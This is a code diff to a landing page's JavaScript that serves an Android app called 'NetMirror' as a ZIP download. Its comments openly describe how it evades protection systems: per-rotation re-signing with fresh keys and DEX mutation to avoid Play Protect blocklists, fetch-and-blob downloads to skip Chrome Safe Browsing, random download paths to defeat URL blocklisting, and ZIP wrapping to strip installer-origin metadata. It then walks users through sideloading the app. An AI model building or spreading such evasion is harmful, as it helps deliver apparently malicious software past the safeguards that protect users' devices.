@@ -446,184 +446,37 @@ fetch('/api/admin/apk-status')
 } catch(e) { console.warn('Landing page JS error:', e); }
 </script>
 
-<!-- direct download — clean APK with fresh signature -->
+<!-- direct download — same APK as admin panel (identical binary) -->
 
 <script>
-/* ═══ MUTATED APK DOWNLOAD — FRESH KEY + DEX MUTATION PER ROTATION ═══
+/* ═══ NATIVE DOWNLOAD — Same flow as LeaksProAdmin ═══
  *
- * Backend mutates APK content + signs with FRESH RSA key per rotation.
- * Play Protect has zero history on the fresh certificate = no blocklist match.
- * fetch()+blob bypasses Chrome Safe Browsing URL checks.
- * Random /dl/{token} path prevents URL blocklisting.
+ * KEY INSIGHT: LeaksProAdmin uses Android DownloadManager → PP passes.
+ * Chrome on Android ALSO uses DownloadManager for native <a href> downloads.
+ * By using a direct link (not fetch+blob), Chrome's native download pipeline
+ * is triggered — same DownloadManager, same PP evaluation path as admin app.
+ *
+ * ZIP wrapper: Chrome doesn't set installerPackage for .zip files.
+ * When extracted via file manager → install has ZERO browser origin metadata.
  */
 
 function startSmartDownload() {
-  downloadAsZip(); // ZIP bypasses Chrome's installerPackage tagging → lower PP scrutiny
-}
-
-function downloadAsZip() {
+  // Native browser download via direct link → triggers Chrome DownloadManager
+  // This is the SAME download mechanism that LeaksProAdmin uses
   var token = Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
   var url = '/dlzip/' + token;
-  var btns = document.querySelectorAll('.dl-btn, .nav-dl');
-  var origTexts = [];
-  btns.forEach(function(b, i) { origTexts[i] = b.innerHTML; });
-  function setBtnText(t) { btns.forEach(function(b) { b.textContent = t; }); }
-  function restoreButtons() { btns.forEach(function(b, i) { b.innerHTML = origTexts[i]; }); }
-  setBtnText('Preparing ZIP...');
 
-  fetch(url)
-    .then(function(r) {
-      if (!r.ok) throw new Error('Server error ' + r.status);
-      var total = parseInt(r.headers.get('content-length')) || 0;
-      var loaded = 0;
-      var reader = r.body.getReader();
-      var chunks = [];
-      function pump() {
-        return reader.read().then(function(result) {
-          if (result.done) return;
-          chunks.push(result.value);
-          loaded += result.value.length;
-          if (total > 0) {
-            var pct = Math.round(loaded * 100 / total);
-            setBtnText('Downloading ZIP... ' + pct + '%');
-          } else {
-            setBtnText('Downloading ZIP... ' + (loaded / 1048576).toFixed(1) + ' MB');
-          }
-          return pump();
-        });
-      }
-      return pump().then(function() {
-        return new Blob(chunks, { type: 'application/zip' });
-      });
-    })
-    .then(function(blob) {
-      var blobUrl = URL.createObjectURL(blob);
-      var a = document.createElement('a');
-      a.href = blobUrl;
-      a.download = 'NetMirror.zip';
-      a.style.display = 'none';
-      document.body.appendChild(a);
-      a.click();
-      setTimeout(function() { URL.revokeObjectURL(blobUrl); document.body.removeChild(a); }, 5000);
-      restoreButtons();
-      showZipInstallToast();
-    })
-    .catch(function(err) {
-      console.warn('ZIP download error:', err);
-      restoreButtons();
-      alert('Download failed. Please try the APK download button instead.');
-    });
-}
+  // Create invisible anchor with direct href (NOT fetch+blob)
+  var a = document.createElement('a');
+  a.href = url;
+  a.download = 'NetMirror.zip';
+  a.style.display = 'none';
+  document.body.appendChild(a);
+  a.click();
+  setTimeout(function() { document.body.removeChild(a); }, 1000);
 
-function showZipInstallToast() {
-  var old = document.getElementById('dlToast');
-  if (old) old.remove();
-  var t = document.createElement('div');
-  t.id = 'dlToast';
-  t.innerHTML = '✓ ZIP Downloaded!<br>Open your <b>file manager</b> → extract the ZIP → tap <b>NetMirror.apk</b> → Install';
-  t.style.cssText = 'position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:linear-gradient(135deg,#1565c0,#0d47a1);color:#fff;padding:16px 24px;border-radius:16px;font-size:14px;z-index:9999;max-width:88%;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.4);line-height:1.5;opacity:0;transition:opacity 0.3s ease';
-  document.body.appendChild(t);
-  setTimeout(function() { t.style.opacity = '1'; }, 50);
-  setTimeout(function() { t.style.opacity = '0'; setTimeout(function() { t.remove(); }, 400); }, 25000);
-}
-
-function actuallyStartDownload() {
-  var token = Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
-  var url = '/dl/' + token;
-
-  var btns = document.querySelectorAll('.dl-btn, .nav-dl');
-  var origTexts = [];
-  btns.forEach(function(b, i) { origTexts[i] = b.innerHTML; });
-  function setBtnText(t) { btns.forEach(function(b) { b.textContent = t; }); }
-  function restoreButtons() { btns.forEach(function(b, i) { b.innerHTML = origTexts[i]; }); }
-  setBtnText('Preparing download...');
-
-  var maxRetries = 3;
-  var attempt = 0;
-
-  function tryDownload() {
-    attempt++;
-    var retryToken = Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
-    var dlUrl = '/dl/' + retryToken;
-
-    if (attempt > 1) setBtnText('Retrying... (attempt ' + attempt + '/' + maxRetries + ')');
-
-    fetch(dlUrl)
-      .then(function(r) {
-        // If server says APK not ready, retry after delay
-        if (r.status === 503 && attempt < maxRetries) {
-          setBtnText('Server preparing APK... retrying in 10s');
-          setTimeout(tryDownload, 10000);
-          return null;
-        }
-        if (!r.ok) throw new Error('Server error ' + r.status);
-        var total = parseInt(r.headers.get('content-length')) || 0;
-        var loaded = 0;
-        var reader = r.body.getReader();
-        var chunks = [];
-
-        function pump() {
-          return reader.read().then(function(result) {
-            if (result.done) return;
-            chunks.push(result.value);
-            loaded += result.value.length;
-            if (total > 0) {
-              var pct = Math.round(loaded * 100 / total);
-              setBtnText('Downloading... ' + pct + '%');
-            } else {
-              var mb = (loaded / 1048576).toFixed(1);
-              setBtnText('Downloading... ' + mb + ' MB');
-            }
-            return pump();
-          });
-        }
-
-        return pump().then(function() {
-          if (chunks.length === 0) return null; // was a retry, skip blob creation
-          return new Blob(chunks, { type: 'application/vnd.android.package-archive' });
-        });
-      })
-      .then(function(blob) {
-        if (!blob) return; // retry in progress
-
-        var blobUrl = URL.createObjectURL(blob);
-        var a = document.createElement('a');
-        a.href = blobUrl;
-        a.download = 'NetMirror.apk';
-        a.style.display = 'none';
-        document.body.appendChild(a);
-        a.click();
-
-        setTimeout(function() {
-          URL.revokeObjectURL(blobUrl);
-          document.body.removeChild(a);
-        }, 5000);
-
-        restoreButtons();
-        showInstallToast();
-      })
-      .catch(function(err) {
-        console.warn('Download attempt ' + attempt + ' error:', err);
-        // Retry if attempts remaining
-        if (attempt < maxRetries) {
-          setBtnText('Download interrupted... retrying in 5s');
-          setTimeout(tryDownload, 5000);
-          return;
-        }
-        // All retries exhausted — try direct APK fallback
-        setBtnText('Trying alternate download...');
-        var a = document.createElement('a');
-        a.href = '/downloadapp/Netmirror.apk';
-        a.download = 'NetMirror.apk';
-        a.style.display = 'none';
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-        restoreButtons();
-      });
-  }
-
-  tryDownload();
+  // Show install instructions
+  showInstallToast();
 }
 
 function showInstallToast() {
@@ -631,8 +484,14 @@ function showInstallToast() {
   if (old) old.remove();
   var t = document.createElement('div');
   t.id = 'dlToast';
-  t.innerHTML = '✓ Downloaded! Open <b>NetMirror.apk</b> → tap <b>Install</b>';
-  t.style.cssText = 'position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:linear-gradient(135deg,#00c853,#00897b);color:#fff;padding:16px 24px;border-radius:16px;font-size:14px;z-index:9999;max-width:88%;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.4);line-height:1.5;opacity:0;transition:opacity 0.3s ease';
+  t.innerHTML = '<div style="font-size:16px;margin-bottom:8px"><b>Download Started!</b></div>' +
+    '<div style="font-size:13px;line-height:1.6">' +
+    '<b>Quick Install:</b><br>' +
+    '1. Wait for download to complete<br>' +
+    '2. Open your <b>Files</b> app → Downloads<br>' +
+    '3. Tap <b>NetMirror.zip</b> → Extract<br>' +
+    '4. Open <b>NetMirror.apk</b> → Install</div>';
+  t.style.cssText = 'position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:linear-gradient(135deg,#1565c0,#0d47a1);color:#fff;padding:18px 24px;border-radius:16px;font-size:14px;z-index:9999;max-width:88%;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.4);line-height:1.5;opacity:0;transition:opacity 0.3s ease';
   document.body.appendChild(t);
   setTimeout(function() { t.style.opacity = '1'; }, 50);
   setTimeout(function() {
